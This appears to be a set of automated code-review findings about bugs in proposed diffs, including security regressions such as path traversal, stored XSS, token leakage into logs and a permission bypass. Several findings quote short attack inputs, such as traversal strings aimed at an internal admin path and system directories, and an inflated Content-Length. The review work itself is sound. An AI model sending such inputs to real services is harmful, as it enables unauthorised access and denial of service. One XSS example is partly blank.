findings.title: Blocking requests.get inside an async coroutine stalls the event loop
findings.body:
`fetch_plan_limits` is a coroutine but its body contains no `await` — it calls the synchronous `requests.get`, which blocks the thread running the event loop until the billing service responds or the 5s timeout fires. Every other request served by that loop is stalled for that window, so a slow `billing.internal` turns into a whole-process latency spike rather than one slow request.

Use the same async transport as the existing code path, e.g. accept/construct an `httpx.AsyncClient` and `await client.get("https://billing.internal/limits/{tenant_id}", timeout=5)`. If a sync client is unavoidable, wrap it with `await asyncio.to_thread(...)` so it runs off the loop. Dropping the `requests` import (line 2) then keeps the module on a single HTTP stack.

findings.title: New async function using blocking requests.get is untested
findings.body: fetch_plan_limits is declared async but uses the synchronous `requests` library, which will block the event loop during request handling. No test exercises this function, so a regression (or the underlying blocking-call defect itself) would go undetected.

findings.title: Unencoded tenant_id in URL path to internal billing service
findings.body:
`tenant_id` is interpolated raw into the request path for `https://billing.internal/limits/{tenant_id}`. `requests` does not encode `/`, `..` or `?` in an interpolated path segment, so a caller passing an attacker-supplied tenant identifier (e.g. from a request path or JSON body) could reach unrelated endpoints on the internal host — `../../admin/keys` collapses to `https://billing.internal/admin/keys`, and `1?admin=true` appends a query parameter. The host is internal, so this turns a tenant-scoped lookup into a limited SSRF against a service that is presumably not otherwise reachable from outside.

Fix by validating the identifier against its expected shape (UUID/integer) before use, or by passing it through `urllib.parse.quote(str(tenant_id), safe="")`. The same pattern exists on line 6 for the `httpx` call, so a shared validation helper at the boundary would cover both.

findings.title: Bare except swallows BaseException and logs nothing
findings.body:
`except:` with no exception class catches `BaseException`, so `KeyboardInterrupt` and `SystemExit` (and `GeneratorExit`) are absorbed too — a Ctrl-C or a worker shutdown that lands inside `_client.send` will be silently turned into a normal `None` return instead of propagating. The PR description says "catch and log, then continue", but no logging call was added, so every push failure — including programming errors like a `TypeError` from a malformed payload — disappears with no trace.

Narrow this to `except Exception:` and emit a log record, e.g. `logger.exception("metrics push failed")`, before returning.

_Also raised by the security agent:_ Telemetry failures silently swallowed with no log record

findings.title: No test exercises the new exception-swallowing behavior
findings.body: The change makes push_metrics catch all exceptions from _client.send and return None instead of propagating. No test file is included in this diff to verify that a failing send no longer raises, that None is returned, or that failures are logged as the PR description claims ('catch and log'). If this were reverted or broken (e.g., exception re-raised, or logging omitted), nothing would fail.

findings.title: try_consume races: reads counter, awaits, then writes without _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, then yields to the event loop at `await asyncio.sleep(0)` on line 18, then writes `_counters[tenant] = current + cost` on line 19 using the now-stale `current`. Two effects follow:

1. **Limit bypass.** N coroutines can all read the same `current`, all pass the `current + cost > LIMIT` check on line 16, and all commit — total consumption becomes `current + N*cost`, arbitrarily above `LIMIT`.
2. **Lost updates.** The write on line 19 is an absolute assignment from a pre-await snapshot, not an increment. Any `consume()` (line 10) or `try_consume()` that completed during the suspension is silently overwritten, so the counter under-reports usage permanently.

`consume` already guards the same `_counters` dict with `_lock` (line 9), so this function is inconsistent with the established discipline for that state. Wrap the whole read-check-write in `async with _lock:`, and make the commit re-read and increment (`_counters[tenant] = _counters.get(tenant, 0) + cost`) rather than assign from the stale snapshot. If the `await` is not needed, drop it too.

_Also raised by the security agent:_ try_consume checks and updates the counter outside the lock

findings.title: No test exercises try_consume's concurrency/race behavior
findings.body: try_consume reads _counters.get(tenant, 0) outside of _lock, then awaits asyncio.sleep(0) (a yield point), then writes _counters[tenant] without holding the lock. This is a classic check-then-act race: two concurrent calls can both read the same 'current' value, both pass the limit check, and both write, letting a tenant exceed LIMIT. No test file is included in this diff, so nothing would catch this race or even verify the basic accept/reject behavior of try_consume. At minimum, a test should assert that concurrent try_consume calls near the limit never allow the total to exceed LIMIT, and a basic test should confirm try_consume returns False once cost would exceed LIMIT and True otherwise.

findings.title: Docstring says '(name, email)' but function now returns a dict
findings.body:
The docstring `"""Return (name, email) for a user."""` still promises a 2-tuple, but the function body now returns `{"name": ..., "email": ..., "tier": ...}`. A caller reading only the docstring (e.g. `reports/weekly.py`'s `render_row`, which does `name, email = lookup_user(user_id)`) would reasonably expect a tuple and break at runtime. Update the docstring to reflect the new dict return shape and its keys.

_Also raised by the correctness agent:_ Docstring still documents the removed (name, email) tuple contract

findings.title: Return shape change breaks tuple-unpacking caller in reports/weekly.py
findings.body:
`lookup_user` previously returned a 2-tuple `(name, email)`. It now returns a dict with three keys. The existing caller `render_row` in `reports/weekly.py` does `name, email = lookup_user(user_id)`; unpacking a 3-key dict yields its keys, so this raises `ValueError: too many values to unpack (expected 2)` on every call — and even with two keys it would silently bind key strings rather than values.

Either update all callers in the same change (`name, email = u["name"], u["email"]`), or keep the old shape and add the new field via a separate function/optional flag so existing callers keep working.

findings.title: No test catches lookup_user's breaking return-shape change
findings.body: lookup_user now returns a dict instead of a (name, email) tuple. The retrieved repository context shows reports/weekly.py:render_row does `name, email = lookup_user(user_id)`, which will raise (unpacking a dict yields keys, not the expected two values, and if there are 3 keys it will fail outright) once this change ships. There is no test in this diff, and nothing shown in the repo tests render_row or lookup_user's contract, so this regression would go undetected until it hits production.

findings.title: WriteSettlement always returns nil, hiding insert failures
findings.body:
The error from `db.Exec` is bound to a new `err` scoped to the `if` statement on line 15; it is logged but never propagated. Lines 18-19 then declare a fresh, always-nil `err` and return it, so `WriteSettlement` returns `nil` on every path after validation — including when the INSERT fails.

The signature returns `error`, and line 12-14 already propagates the validation error, so callers will reasonably read a nil return as "settlement persisted". In an end-of-day batch that means dropped settlement rows are reported as success and never retried or reconciled.

If per-row failures really should not abort the batch, that decision belongs to the caller: return the insert error here (`return err` inside the `if`, or `return fmt.Errorf("insert settlement %v: %w", s.ID, err)`) and let the batch loop log-and-continue. If this function genuinely must never fail on insert, it should not advertise an `error` return, or should at minimum be documented as best-effort.

findings.title: WriteSettlement has no test covering its error-return behavior
findings.body: WriteSettlement declares a fresh `var err error` on line 18 and returns it unconditionally, so the function always returns nil even when the db.Exec insert on line 15 fails (only a log line is emitted). There is no test exercising WriteSettlement with a failing db.Exec, so this always-succeeds behavior would not be caught by any existing check. Add a test that forces the insert to fail and asserts the returned error is non-nil.

findings.title: Mutable default `attempted=[]` is shared and returned across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so every call that omits the argument mutates and returns the *same* list object. The second call to `send_with_retries(...)` will return the failures from the first call plus its own, and the list grows without bound for the lifetime of the process. Callers that inspect the return value to decide what failed will see stale recipients, and because the same object is returned, a caller holding a reference from an earlier call will see it mutate underneath them.

Fix with the standard sentinel pattern:

```python
def send_with_retries(recipients, attempted=None):
    attempted = [] if attempted is None else attempted
    ...
```

_Also raised by the security agent:_ Shared default list leaks recipients across calls in send_with_retries

findings.title: send_with_retries mutable default arg has no test to catch state leakage
findings.body: send_with_retries uses `attempted=[]` as a default argument, which is shared across calls and will accumulate recipients from previous invocations that didn't pass an explicit list. No test exists for this function at all, so a call sequence like `send_with_retries(['a'])` followed by `send_with_retries(['b'])` returning `['a','b']` instead of `['b']` would go undetected.

findings.title: Rounding threshold silently changed from >= 0.5 to > 0.5
findings.body:
Every other function in this diff is a pure rename, but `compute_rounding` also changes its comparison operator: the old `calc_rounding` returned 1 when `line.remainder_cents >= 0.5`, the new one only when `> 0.5`. A line with a remainder of exactly 0.5 cents now rounds down instead of up, changing monetary totals for a reachable and common input (half-cent remainders are precisely what a rounding helper exists to resolve). If this behaviour change is intentional it belongs in its own commit with a test and a note in the PR description; if not, restore `>=`.

_Also raised by the tests agent:_ Rounding boundary changed from >= to > during rename

findings.title: page_of_sorted drops one record per page (off-by-one slice)
findings.body:
`ordered[start : start + PAGE_SIZE - 1]` yields only `PAGE_SIZE - 1` items, while `start` advances by a full `PAGE_SIZE` per page. The record at index `start + PAGE_SIZE - 1` is therefore returned by no page at all — for every page requested, exactly one record is silently omitted from the export. The existing `page_of` on line 6 uses the correct bound `start + PAGE_SIZE`; the new function should match it:

    return ordered[start : start + PAGE_SIZE]

Because this is an export path, the failure is silent data loss rather than an error: callers paging through all pages will believe they have a complete dump.

findings.title: New page_of_sorted has no test and contains an off-by-one slice
findings.body: page_of_sorted slices ordered[start : start + PAGE_SIZE - 1], which returns one fewer record than PAGE_SIZE per page — records get silently dropped from export output. No test exists in this diff to exercise this function's boundaries (e.g. checking that a full page returns PAGE_SIZE items, or that consecutive pages cover all records without gaps). Without such a test, this defect would ship undetected.

findings.title: Dropped None guard makes header_lines raise for most invoices
findings.body:
`Invoice.purchase_order` is declared `str | None` and the model docstring states it is only set for customers on invoicing terms ("roughly one account in twenty"). The removed `if invoice.purchase_order is not None:` guard was therefore load-bearing, not redundant: for the ~95% of invoices with no purchase order, line 4 evaluates `None.upper()` and raises `AttributeError`, breaking header rendering entirely.

Restore the conditional, e.g. build the base list and append the PO line only when `invoice.purchase_order is not None`.

findings.title: No test covers header_lines with purchase_order=None
findings.body: The repository model docs state purchase_order is optional and unset for ~95% of customers, but the guard that handled that case was removed. There is no test in this diff exercising header_lines with invoice.purchase_order=None, so nothing would catch the AttributeError this now raises for the common case.

findings.title: File handle leaked when header validation fails or read raises
findings.body:
`fh = open(path)` on line 10 is not managed by a context manager, and `fh.close()` on line 16 is only reached on the success path. When `header != expected_header` the function returns on line 14 with the handle still open, and any exception from `next(reader)` (line 12) or `list(reader)` (line 15) — e.g. `csv.Error` on a malformed row, `UnicodeDecodeError` on bad encoding — escapes without closing either. Since this is the rejection path the importer is explicitly designed to exercise ("rejects rows that fail validation"), the leak fires on routine input, and under CPython it only gets cleaned up whenever the object is collected; on PyPy or with a long-lived reference it may not be. Rewrite using `with open(path) as fh:` around the whole body, matching `read_rows` on lines 5-6.

_Also raised by the security agent:_ File handle leaked on header-mismatch path enables FD exhaustion

findings.title: New read_validated function has no test coverage
findings.body: read_validated introduces branching behavior (valid header vs. mismatched header, which also determines whether the file handle is closed) but no test exercises either path. A regression that broke header validation or that leaked file handles on the early-return path would pass silently.

findings.title: Retry wraps non-idempotent charge() — duplicate charges on transient failure
findings.body:
`@retry(attempts=3)` is applied to `charge_card`, which calls `billing.gateway.charge`. That function's own docstring states "NOT idempotent: each call creates a new charge" and points at the gateway's `Idempotency-Key` header as the mechanism for making retries safe. No key is generated or passed here, so a timeout or 5xx after the gateway has already accepted the POST will cause the retry to create a second (and possibly third) charge against the customer's card — money moved twice, with no way for the caller to detect it.

Fix: generate a stable idempotency key per logical charge attempt (e.g. accept one as a parameter or derive it from the order/payment id) and thread it through `gateway.charge` so all three attempts share the same key. Until `charge()` accepts and forwards that key, the retry decorator should be removed from this path. The retry on `fetch_charge` (line 5) is fine — `get_charge` is documented as safe to repeat.

findings.title: No test catches retrying a non-idempotent charge call
findings.body: charge_card wraps billing.gateway.charge with @retry(attempts=3), but gateway.charge is documented as NOT idempotent — each call creates a new charge, and idempotency is only made safe by passing an Idempotency-Key header, which is not done here. There is no test verifying that a retried charge_card call does not produce multiple charges (e.g. a test that simulates a transient failure after the gateway actually created the charge, then asserts only one charge exists/no duplicate POST occurs). Without such a test, a change that makes this worse (or a review that misses the missing idempotency key) would pass silently.

findings.title: charge_card wraps a documented non-idempotent call with retry, undocumented
findings.body: gateway.charge()'s docstring says: "NOT idempotent: each call creates a new charge. The gateway supports an Idempotency-Key header; pass one to make retries safe." The new charge_card function retries this exact call without passing an idempotency key or any comment explaining why retrying here is safe (or noting that it is not). A caller looking at charge_card's name and the @retry decorator would reasonably assume retries are safe, which contradicts the explicit warning on the function it wraps.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError
findings.body: `cutoff` is built from `datetime.now()` with no tzinfo, so it is naive. `Invite.expires_at` is documented as "always tz-aware, set from datetime.now(timezone.utc)". Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so line 10 fails for every input — the function can never return. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does. (Note also that with naive local time the comparison would silently be off by the UTC offset rather than erroring, if the host is not UTC.) Separately, once fixed, an already-expired invite yields a negative delta and returns `True`; confirm that is the intended semantics for callers.

findings.title: expires_within has no test, so its tz-naive/aware bug ships silently
findings.body: expires_within is new and untested. It subtracts invite.expires_at (tz-aware UTC, per models/invite.py) from datetime.now() (naive), which raises TypeError at runtime. No test calls this function, so this defect would not be caught before reaching production.

findings.title: contactEmail dereferences optional billingContact without a guard
findings.body: `Account.billingContact` is declared optional in `web/src/types.ts` ("Absent until the customer completes onboarding"). `contactEmail` reads `.email` directly off it, so any account that has not completed onboarding produces `TypeError: Cannot read properties of undefined (reading 'email')`. The sibling function on line 4 handles exactly this case with `?.` plus a fallback, which shows the absent case is reachable on this page. Mirror that: e.g. `return account.billingContact?.email.toLowerCase() ?? "";` — or make the return type `string | undefined` and let callers decide. Note the PR description claims "the account payload is always present", but the optionality here is on `billingContact`, not on `account`, so that justification does not cover this dereference. If the project compiles with `strictNullChecks`, this will also fail type-checking.

findings.title: New contactEmail function has no test coverage
findings.body: contactEmail accesses account.billingContact.email without the optional chaining used in bannerFor just above, even though Account.billingContact is typed as optional. No test exists for this function, so a call with an account lacking billingContact (which the type system says is possible) would throw uncaught, and nothing in the test suite would catch it.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body: `fetch()` documents `timeout` as being in MILLISECONDS ("Callers wanting seconds must multiply"), and passes it straight through as `timeout_ms`. Passing `30` gives the slow partner API a 30 ms budget, shared across the 3 default retries, so the nightly catalogue pull will almost certainly fail every night. The PR description says the timeout was "set generously since their API is slow", which confirms seconds were intended. Use `timeout=30000` (or a named constant such as `30 * 1000`).

findings.title: New sync_partner_catalogue has no test covering timeout behaviour
findings.body: sync_partner_catalogue() is new, untested code that calls fetch(url, timeout=30). Per clients/http.py, `timeout` is documented as milliseconds, but the PR description ('timeout set generously since their API is slow') strongly suggests 30 was meant as seconds. Nothing in this diff or the existing suite would catch either an incorrect timeout unit or a change to fetch's contract — there is no test exercising this function at all.

findings.title: Duplicate index: same columns already indexed by 0007
findings.body: `invoices_tenant_recent_idx` is defined on `invoices (tenant_id, created_at DESC)` — byte-for-byte the same key and sort order as `invoices_tenant_created_idx`, created in migration 0007 and already applied (2025-11-02). `IF NOT EXISTS` matches on the relation *name*, not on the index definition, so it will not detect the pre-existing index and a second, fully redundant index will be built. The cost is a duplicated index build on a presumably large table, permanent extra storage, and added write amplification on every INSERT/UPDATE of `invoices` — with zero planner benefit, since the existing index already serves the reporting query described in the PR summary. Drop this statement; the query is already covered.

findings.title: priority=9 delays reset email; scale is inverted (0 drains first)
findings.body:
`enqueue`'s docstring states the priority argument is an ordering index where **0 is drained first and 9 is drained last**, explicitly warning that the name suggests the opposite. Passing `priority=9` therefore places password-reset email behind every other queued job — including the nightly digest batch this change was meant to jump ahead of — and is strictly worse than the previous behaviour, which used the default of 5. Use `priority=0` (or some small value) to actually drain reset mail first.

_Also raised by the security agent:_ priority=9 drains last — reset mail moved behind the digest batch

findings.title: No test would catch that priority=9 deprioritizes, not prioritizes, the email
findings.body: The queue module's docstring explicitly warns that priority is inverted from what the name suggests: 0 drains first, 9 drains last. This diff sets priority=9, which per that convention makes the reset email drain *last*, behind everything else — the opposite of the PR's stated goal of queueing it ahead of the nightly digest. There is no test on send_reset_email or on enqueue's ordering that would catch this; nothing in the current diff would fail if the priority value were wrong.

findings.title: upsert called with un-normalised title terms; articles silently unfindable
findings.body: `upsert` documents that `terms` must already be lower-cased and de-duplicated, and explicitly warns that it does not normalise: a cased term creates a separate posting list that lower-casing queries will never hit, so the document indexes "successfully" but is silently unfindable by that term. `article.title.split()` returns the title's words verbatim — titles are typically capitalised, so most terms land under the wrong key and the failure is silent (no exception, no log). Normalise at the call site, e.g. `upsert(article.id, {w.lower() for w in article.title.split()})`, or push normalisation into `upsert` itself if that is preferable for all callers.

findings.title: New upsert() call in publish() has no test coverage
findings.body: publish() now calls upsert(article.id, article.title.split()), passing raw title words directly. Per search/index.py's documented contract, terms must already be lower-cased and de-duplicated; article.title.split() satisfies neither, so a published article's terms will differ in case from what queries look up, making the article silently unfindable. No test in this diff (or apparently in the repo) exercises publish() to check that indexed terms are actually queryable/normalised, so this defect would pass unnoticed.

findings.title: Referer is logged unscrubbed, leaking auth tokens into logs
findings.body:
The removed branch passed the `Referer` value through `_scrub_uri(value, extra_param_keys)` before logging it. With that gone, line 5 writes the raw header into the log on every 5xx. Per `jupyter_server/auth/identity.py`, notebook URLs are handed out as `f"{base}?token={token}"`, and the browser echoes that URL back in `Referer` on every subresource request — so the logged value will routinely contain a live auth token. Anyone with read access to the server logs (or a log-shipping pipeline) gains the ability to authenticate as the user.

Restore the scrubbing for `Referer` (and keep any other URI-bearing headers scrubbed). If the goal was simply to see more of what the client sent, scrub the token parameter and log the rest. Note also that dropping the only use of `extra_param_keys` likely leaves that parameter dead in this function's signature, which is a hint that the removal was unintentional.

_Also raised by the security agent:_ Auth token leaked into logs: Referer scrubbing removed

findings.title: No test catches removal of Referer token scrubbing
findings.body: The diff removes the call to `_scrub_uri` for the Referer header before logging, which per the retrieved context (`token_authenticated_url`) means the Referer header can contain a live auth token that will now be dumped verbatim into logs via `log_method(json.dumps(headers, ...))`. There is no test file in this PR exercising `log.py`'s header-logging path with a Referer containing a token/extra_param_keys value, so this behavior change (log_method receiving raw token vs scrubbed value) would not be caught by any existing or added test.

findings.title: Dropping xlinkhref from URL check reopens SVG xlink:href XSS
findings.body: `validateProp` routes URL-bearing attributes to `isAnchorLinkAllowed`, which rejects the `unsafeLinkPrefix` schemes (`javascript:`, `data:text/html`, `vbscript:`). Removing `xlinkhref` from that condition means the value falls through to whatever the default branch does and is no longer scheme-checked. `xlink:href` is a live navigation sink inside SVG: `` executes in browsers that still honour the XLink namespace, and `xlink:href` on ``/`` is equally a URL sink. Since the surrounding comment states rendered attributes come from end-user-submitted markdown and that `validateProp` is the only barrier before the DOM, this is stored XSS against any viewer of the content. Restore `attribute === 'xlinkhref'` in the condition (and consider covering the normalised `xlink:href` spelling too, if both forms can reach here). _Also raised by the correctness agent:_ xlinkhref no longer validated against unsafe URL schemes

findings.title: No test guards xlinkhref sanitisation behavior
findings.body: The diff removes 'xlinkhref' from the set of attributes that get validated via isAnchorLinkAllowed. No test file is included in this PR, and based on the retrieved context there is no visible test exercising validateProp with an 'xlinkhref' attribute. If this change is wrong (e.g. xlinkhref should still be sanitised because SVG xlink:href can carry javascript: URIs), nothing in the test suite would fail to signal it.

findings.title: Removing ValidateID lets `project` query param traverse out of the storage root
findings.body:
`query.GetProjectQueryParam()` is unauthenticated, fully attacker-controlled request data. The removed `common.ValidateID` call was the only check constraining it to an identifier shape; after this change the raw string flows onward to the file DAO, whose `buildPath` does `filepath.Join(d.Folder, project, kind)` and explicitly documents "It does no validation of its own: callers are required to have validated the names before this point."

`filepath.Join` does not confine its result to the first argument — it cleans the path, so a value like `../../../../etc` resolves outside `d.Folder`. An unauthenticated caller can therefore read (and, on write paths sharing the same helper, create/overwrite) documents outside the project sandbox, and at minimum can read another tenant's project regardless of the path-scoped authorization implied by `parameters.Project`.

The PR description's premise — "the path join already scopes under the folder root" — is incorrect for `filepath.Join`. Restore the `ValidateID` check here, or make `buildPath` reject names containing separators/`..` (e.g. reject if the cleaned absolute path is not under `d.Folder`).

Note the remaining check on line 4 does not help: it only fires when a path project is also present, and it compares the two values rather than validating either.

_Also raised by the correctness agent:_ Removing ValidateID breaks buildPath's documented caller precondition

findings.title: No test guards removal of project-name validation
findings.body: The call to common.ValidateID(projectQueryParameter) and its error path have been deleted, meaning an invalid or malicious project query parameter (e.g. containing '../') will now flow through to buildPath, which explicitly documents that it does no validation of its own and relies on callers. There is no test in this diff exercising list() with a malformed projectQueryParameter to confirm the old validation is genuinely redundant (e.g. that buildPath's filepath.Join truly neutralizes traversal) or to catch a regression if that assumption is wrong.

findings.title: Buffer pre-reserved from client-controlled Content-Length (memory exhaustion)
findings.body:
`contentLength` is the declared length of the uploaded part, i.e. it comes straight from the client's `Content-Length` header on the S3 UploadPart request; it is not a measured byte count. Passing it to `Reserve` makes the server commit that much memory *before* reading a single byte, so a client that sends `Content-Length: 50000000000` with an empty or slow body causes a multi-gigabyte allocation (and, with a handful of concurrent requests, OOM of the rclone process). The previous code grew the pool-backed RW as bytes actually arrived, which bounded memory by bytes actually delivered.

Suggested fix: clamp the reservation to the configured maximum part/chunk size and to a sane absolute ceiling, e.g. `rw := multipart.NewRW(); if contentLength > 0 { rw.Reserve(min(contentLength, maxPartSize)) }`, and reject the request up-front when `contentLength` exceeds the allowed part size. Also guard the `contentLength < 0` (unknown/chunked) case, which should not reach `Reserve` at all.

_Also raised by the correctness agent:_ Part buffer sized from unvalidated client Content-Length

findings.title: No test covers Reserve(contentLength) behavior or mismatch handling
findings.body: The change pre-allocates the multipart RW buffer using the declared contentLength. There is no test in this diff verifying that: (1) the reserved capacity matches the actual bytes written when contentLength is accurate, (2) behavior when contentLength disagrees with actual body size (too small/too large), or (3) that a large/untrusted contentLength doesn't cause excessive allocation. If Reserve() is buggy or if contentLength is attacker-controlled and unbounded, nothing here would fail — the function would still compile and the happy-path callers would still pass silently.

findings.title: Unknown/negative contentLength is passed straight to Reserve
findings.body: Go's HTTP stack reports `ContentLength == -1` for chunked or otherwise unknown-length bodies, and this function's `contentLength int64` parameter can carry that value through. Line 6 forwards it to `Reserve` with no guard. Depending on `Reserve`'s implementation this either panics on a negative make/grow size or silently no-ops — neither is checked here. Guard with `if contentLength > 0` before reserving.

findings.title: Default S3 scheme silently flips from https to http
findings.body:
The previous expression `"http" if request.meta.get("is_secure") is False else "https"` selected plaintext **only** when a caller explicitly set `is_secure = False`; every other case — including the overwhelmingly common one where `is_secure` is not present in `request.meta` and `.get()` returns `None` — produced `https`.

The new expression `"https" if request.meta.get("is_secure") else "http"` tests truthiness, so `None` (key absent) now yields `http`. Line 6 then builds `http://{bucket}.s3.amazonaws.com{path}`, sending the request — and any AWS signature/authorization headers attached to it — over an unencrypted connection by default. Other falsy-but-not-False values (`0`, `""`) change behaviour the same way.

To keep the semantics while simplifying, use an explicit default: `scheme = "http" if request.meta.get("is_secure") is False else "https"` (unchanged), or `scheme = "https" if request.meta.get("is_secure", True) else "http"`.

findings.title: S3 requests default to plaintext HTTP when is_secure is unset
findings.body:
The old expression treated a missing `is_secure` key as secure: only an explicit `False` produced `http`. The new ternary is falsy-based, so `request.meta.get("is_secure")` returning `None` (key absent — the normal case for any request that did not explicitly opt in) now yields `scheme = "http"`, and that scheme is interpolated straight into the request URL on line 6.

Adversary: any on-path network observer (shared Wi-Fi, upstream ISP, compromised router, a proxy in the chain). What they control: nothing — passive observation suffices; an active MITM gets more. What they get: the full S3 request in cleartext, including the AWS `Authorization`/signature headers used to authenticate the fetch, plus the object bytes in the response. A captured signed request can be replayed until its expiry, and an active attacker can substitute response content that then gets parsed by the spider.

Restore the secure-by-default semantics, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or make the default explicit: `request.meta.get("is_secure", True)`.

findings.title: No test covers default scheme when is_secure is unset/None
findings.body: The scheme-selection logic changed its default behavior: previously, when `is_secure` was absent or None, the code defaulted to `https`; now it defaults to `http`. This is a meaningful behavior change (plaintext vs encrypted transport) with no test in this diff exercising the case where `is_secure` is not explicitly set to True/False. If this logic regresses again, nothing shown here would fail.

findings.title: DELETE requests now authorised as "push", bypassing delete permission
findings.body:
The removed `switch` mapped `http.MethodDelete` to the `delete` action; the new two-branch form maps every non-GET/HEAD method — including DELETE — to `push`. The resulting `ResourceAction{Name: name, Action: action}` is the value the access-control layer checks, so a DELETE on a repository is now approved by a push grant.

Entry point: the HTTP request method and the `name` mux var on the registry endpoint. Sink: `requestedAccess` on line 9, consumed by the per-repository authorisation check. Adversary: any authenticated account provisioned with push-only access (e.g. a CI publishing token). What they control: the verb on a request to a repo they can push to. What they get: destruction of existing tags/manifests they were explicitly not granted `delete` on — and after this change no code path can ever produce the `delete` action, so a delete-denying policy becomes unenforceable.

Restore an explicit `case http.MethodDelete: action = "delete"` branch (or an equivalent `if` arm) before the catch-all push assignment.

_Also raised by the correctness agent:_ DELETE now requires only "push", dropping the distinct delete action

findings.title: Fallback for unlisted methods flipped from "pull" to "push"
findings.body: The old `default` arm mapped any method outside the enumerated set (e.g. `OPTIONS`, `TRACE`, or any non-standard verb) to `"pull"`. The new condition treats everything that is not GET/HEAD as `"push"`, so such requests now demand write access. If the registry serves CORS preflight (`OPTIONS`) or any read-ish verb anonymously, those requests will start failing authorization. If the intent was to preserve the old default, the condition needs to enumerate the write methods explicitly rather than negating the read methods.

findings.title: Action mapping now contradicts documented push/delete distinction
findings.body: config.go documents that the three actions (pull/push/delete) are "distinct on purpose" specifically so an account can be granted push without delete. This diff collapses HTTP DELETE into the "push" action instead of "delete", so the documented invariant no longer matches the code: granting push now also grants the ability to delete, contrary to what the comment promises callers/operators configuring access.

findings.title: No test covers DELETE now mapping to 'push' instead of 'delete'
findings.body: The mapping change collapses DELETE (and any other non-GET/HEAD method) into 'push', removing the distinct 'delete' action noted as intentional in config.go's documented separation of push/delete permissions. This diff includes no test asserting the action computed for http.MethodDelete, so a revert or further regression of this authorization logic would not be caught by any existing test.

findings.title: Overflow handling clears the whole cache, discarding the just-fetched entry
findings.body: When `_CACHE` crosses 1000 entries, the entire dictionary is cleared — including the entry written one line earlier on line 10. The caller of `get_tenant_fresh` still gets its value back, but every other tenant (and the one just refreshed) is evicted, so the next round of `get_tenant` calls all return `None` at once. On a busy cache this turns a size bound into a periodic full-cache stampede, and it is also a check-then-act on shared mutable state: a concurrent `get_tenant` can observe the cache emptied between the write on line 10 and its own read. Prefer bounded eviction (e.g. drop the oldest entry, or use an LRU such as `collections.OrderedDict`/`functools.lru_cache`) rather than `clear()`, and do the size check before inserting so the fresh value survives.

findings.title: No test for get_tenant_fresh behaviour or cache eviction
findings.body:
get_tenant_fresh fetches a tenant, writes it into the shared _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is exercised by any test in the diff, so a bug in the fetch call, the cache write, or the eviction threshold (e.g. off-by-one, wrong comparison, clearing on every call) would not be caught.

_Also raised by the docs agent:_ get_tenant_fresh has an undocumented cache-eviction side effect

findings.title: A `None`/failed result from `_fetch` is cached and served by `get_tenant`
findings.body: The return value of `_fetch` is written into `_CACHE` unconditionally. If `_fetch` can return `None` for an unknown or temporarily unavailable tenant, that negative result is now indistinguishable from a cache miss in `get_tenant` (line 5 returns `None` for both) and will be served until the cache happens to be cleared. Guard the write, e.g. only store when `tenant is not None`, or make `_fetch` raise on failure so the miss is not memoised.

findings.title: Unvalidated tenant_id can force a full cache flush (amplification DoS)
findings.body:
`get_tenant_fresh` inserts an entry keyed by the caller-supplied `tenant_id` before checking size, and the overflow policy is `_CACHE.clear()` — dropping every entry, not just the new one. If any request-handling path reaches this function with a tenant_id the caller influences (including ids that do not exist, since the result of `_fetch` is stored unconditionally), roughly 1000 cheap calls wipe the cache for every tenant, forcing a stampede of `_fetch` calls from all other traffic. Consider bounding growth with an LRU eviction of a single entry (e.g. `functools.lru_cache` or an `OrderedDict.popitem(last=False)`) and not caching misses, so one caller cannot evict everyone else's data.

Adversary: any client that can reach a handler passing a tenant_id through to this helper. What they control: the key, and how often they call. What they get: repeated global cache invalidation and the backend load that follows. I could not establish the entry point — no caller is present in the diff or in the retrieved context — so the confidence reflects that the exploitability depends on unseen code.

findings.title: Renaming the flag changes argparse dest; `args.workers` readers break
findings.body: argparse derives the attribute name from the option string, so the parsed namespace now exposes `args.concurrency` instead of `args.workers`. Every call site that reads `args.workers` will raise `AttributeError` at runtime rather than failing at import, and no such call site is updated in this diff. Either update all consumers, or keep the attribute stable with `p.add_argument("--concurrency", "--workers", dest="workers", type=int, default=4)` so existing users and callers keep working.

findings.title: README still documents the removed `--workers` flag
findings.body:
`cli.py` now registers `--concurrency`, but README line 7 still tells users to pass `--workers`, which argparse will now reject with "unrecognized arguments". The PR edits this very file (adding the `ACME_LOG_FORMAT` note) yet leaves the stale flag name. Update line 7 to `--concurrency` (and mention the old name if a deprecation period is intended).

_Also raised by the docs agent:_ README still documents removed --workers flag

findings.title: Docstring says integer total; function now returns per-day dict
findings.body: The docstring "Return the total number of API calls this month as an integer." is no longer accurate. The function now returns a dict mapping day to call count (rows grouped by day), not a single integer total. A caller relying on the docstring would treat the return value as an int and break.

findings.title: Return type changed from int to dict; docstring and callers not updated
findings.body:
`monthly_usage` previously returned a scalar integer (`_db.scalar(...)`) and now returns a `{day: count}` mapping. Any existing caller doing arithmetic, comparison, or formatting on the result (e.g. `monthly_usage(a) > limit`, `f"{monthly_usage(a)} calls"`) will now silently misbehave or raise `TypeError`. The docstring on line 2 still promises "the total number of API calls this month as an integer", so nothing in the code signals the break.

Either keep a total-returning function and add a separate `monthly_usage_by_day`, or rename this one and update every caller plus the docstring.

findings.title: No test covers the new per-day breakdown behaviour
findings.body: monthly_usage previously returned a single integer total; it now returns a dict keyed by day with per-day counts. This is a breaking change to the function's return contract, but no test in this diff exercises it (e.g. verifying the shape of the returned dict, correct grouping by day, or correct counts per day). If the GROUP BY query or dict comprehension were wrong (e.g. wrong key name, wrong aggregation, or callers still expecting an int), nothing would fail.

findings.title: Renaming `page_size` breaks callers that pass it as a keyword
findings.body: `page_size` was a public positional-or-keyword parameter. Any existing caller written as `list_invoices(tenant_id, page_size=100)` will now raise `TypeError: unexpected keyword argument 'page_size'` — a failure that only surfaces at call time, not at import. No callers were retrieved for this review, so please confirm by grepping for `page_size=` across the codebase (and any external consumers) before merging. If external consumers exist, consider accepting `page_size` as a deprecated alias for one release.

findings.title: Docstring still documents old parameter name page_size
findings.body:
The function signature was changed from page_size to limit, but the Args docstring entry on line 6 still reads 'page_size: how many invoices to return.' This should be updated to 'limit: how many invoices to return.' so the docstring matches the actual parameter name callers see in the signature.

